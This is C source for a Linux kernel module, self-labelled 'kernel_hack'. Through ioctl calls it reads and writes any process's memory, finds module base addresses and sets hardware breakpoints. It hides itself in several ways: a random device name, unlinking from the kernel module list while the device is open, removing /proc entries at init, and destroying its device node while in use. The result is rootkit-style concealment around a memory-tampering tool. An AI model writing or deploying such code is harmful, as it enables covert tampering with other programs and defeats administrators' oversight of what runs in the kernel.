#include <linux/module.h>
#include <linux/tty.h>
#include <linux/miscdevice.h>
#include <linux/proc_fs.h>
#include <linux/cdev.h>
#include "comm.h"
#include "memory.h"
#include "process.h"
#include "hw_breakpoint.h"

#if defined(MODULE) && (LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0))
	MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
#endif

long dispatch_ioctl(struct file *const file, unsigned int const cmd,
		    unsigned long const arg)
{
	static COPY_MEMORY cm;
	static MODULE_BASE mb;
	static char name[0x100] = {0};

	switch (cmd) {
	case OP_READ_MEM:
		if (copy_from_user(&cm, (void __user *)arg, sizeof(cm)))
			return -EFAULT;
		if (!read_process_memory(cm.pid, cm.addr, cm.buffer, cm.size))
			return -EIO;
		break;
	case OP_WRITE_MEM:
		if (copy_from_user(&cm, (void __user *)arg, sizeof(cm)))
			return -EFAULT;
		if (!write_process_memory(cm.pid, cm.addr, cm.buffer, cm.size))
			return -EIO;
		break;
	case OP_MODULE_BASE:
		if (copy_from_user(&mb, (void __user *)arg, sizeof(mb)) ||
		    copy_from_user(name, (void __user *)mb.name,
				   sizeof(name) - 1))
			return -EFAULT;
		mb.base = get_module_base(mb.pid, name);
		if (copy_to_user((void __user *)arg, &mb, sizeof(mb)))
			return -EFAULT;
		break;

#ifdef CONFIG_HW_BREAKPOINT_MODE
	case OP_CMD_HWBP_ADD:
	case OP_CMD_HWBP_ENABLE: {
		HW_BREAKPOINT_CTL ctl;
		if (copy_from_user(&ctl, (void __user *)arg, sizeof(ctl)))
			return -EFAULT;
		ctl.action = HW_BP_ADD;
		return handle_hw_breakpoint_control(&ctl);
	}
	case OP_CMD_HWBP_DISABLE: {
		HW_BREAKPOINT_CTL ctl;
		if (copy_from_user(&ctl, (void __user *)arg, sizeof(ctl)))
			return -EFAULT;
		ctl.action = HW_BP_REMOVE;
		return handle_hw_breakpoint_control(&ctl);
	}
	case OP_CMD_HWBP_GET_HITS: {
		HW_BREAKPOINT_GET_HITS_CTL ctl;
		if (copy_from_user(&ctl, (void __user *)arg, sizeof(ctl)))
			return -EFAULT;
		return handle_hw_breakpoint_get_hits(&ctl, arg);
	}
	case OP_CMD_HWBP_CLEAR:
		return handle_hw_breakpoint_clear_all();
#endif /* CONFIG_HW_BREAKPOINT_MODE */

	default:
		break;
	}
	return 0;
}

static struct file_operations dispatch_functions = {
	.owner          = THIS_MODULE,
	.open           = dispatch_open,
	.release        = dispatch_close,
	.unlocked_ioctl = dispatch_ioctl,
};

struct mem_tool_device {
	struct cdev    cdev;
	struct device *dev;
	int            max;
};

static struct mem_tool_device *memdev;
static dev_t                   mem_tool_dev_t;
static struct class           *mem_tool_class;
static const char             *devicename;

#ifdef MODULE
static struct list_head *prev_module;
#endif

int dispatch_open(struct inode *node, struct file *file)
{
	file->private_data = memdev;
#ifdef MODULE
	prev_module = __this_module.list.prev;
	list_del_init(&__this_module.list);
#endif
	device_destroy(mem_tool_class, mem_tool_dev_t);
	class_destroy(mem_tool_class);
	return 0;
}

int dispatch_close(struct inode *node, struct file *file)
{
#ifdef MODULE
	list_add(&__this_module.list, prev_module);
#endif
	mem_tool_class = class_create(THIS_MODULE, devicename);
	memdev->dev    = device_create(mem_tool_class, NULL, mem_tool_dev_t,
				       NULL, "%s", devicename);
	return 0;
}

static int __init driver_entry(void)
{
	int ret;

	devicename = get_rand_str();

	ret = alloc_chrdev_region(&mem_tool_dev_t, 0, 1, devicename);
	if (ret < 0) {
		pr_err("kernel_hack: alloc_chrdev_region failed: %d\n", ret);
		return ret;
	}

	memdev = kmalloc(sizeof(*memdev), GFP_KERNEL);
	if (!memdev) { ret = -ENOMEM; goto err_unregister; }
	memset(memdev, 0, sizeof(*memdev));

	cdev_init(&memdev->cdev, &dispatch_functions);
	memdev->cdev.owner = THIS_MODULE;
	memdev->cdev.ops   = &dispatch_functions;

	ret = cdev_add(&memdev->cdev, mem_tool_dev_t, 1);
	if (ret) { pr_err("kernel_hack: cdev_add failed: %d\n", ret); goto err_free; }

	mem_tool_class = class_create(THIS_MODULE, devicename);
	if (IS_ERR(mem_tool_class)) {
		ret = PTR_ERR(mem_tool_class);
		pr_err("kernel_hack: class_create failed: %d\n", ret);
		goto err_cdev;
	}

	memdev->dev = device_create(mem_tool_class, NULL, mem_tool_dev_t,
				    NULL, "%s", devicename);
	if (IS_ERR(memdev->dev)) {
		ret = PTR_ERR(memdev->dev);
		pr_err("kernel_hack: device_create failed: %d\n", ret);
		goto err_class;
	}

	remove_proc_subtree("sched_debug", NULL);
	remove_proc_entry("uevents_records", NULL);
	unregister_chrdev_region(mem_tool_dev_t, 1);

#ifdef CONFIG_HW_BREAKPOINT_MODE
	ret = khack_hw_bp_module_init();
	if (ret) {
		pr_warn("kernel_hack: hw_bp init failed: %d (continuing)\n", ret);
		ret = 0;
	}
#endif

	pr_info("kernel_hack: ready at /dev/%s\n", devicename);
	return 0;

err_class:  class_destroy(mem_tool_class);
err_cdev:   cdev_del(&memdev->cdev);
err_free:   kfree(memdev);
err_unregister: unregister_chrdev_region(mem_tool_dev_t, 1);
	return ret;
}

#ifdef MODULE
static void __exit driver_unload(void)
{
#ifdef CONFIG_HW_BREAKPOINT_MODE
	khack_hw_bp_module_exit();
#endif
	device_destroy(mem_tool_class, mem_tool_dev_t);
	class_destroy(mem_tool_class);
	cdev_del(&memdev->cdev);
	kfree(memdev);
	unregister_chrdev_region(mem_tool_dev_t, 1);
}
module_init(driver_entry);
module_exit(driver_unload);
#else
late_initcall(driver_entry);
#endif

MODULE_LICENSE("GPL");
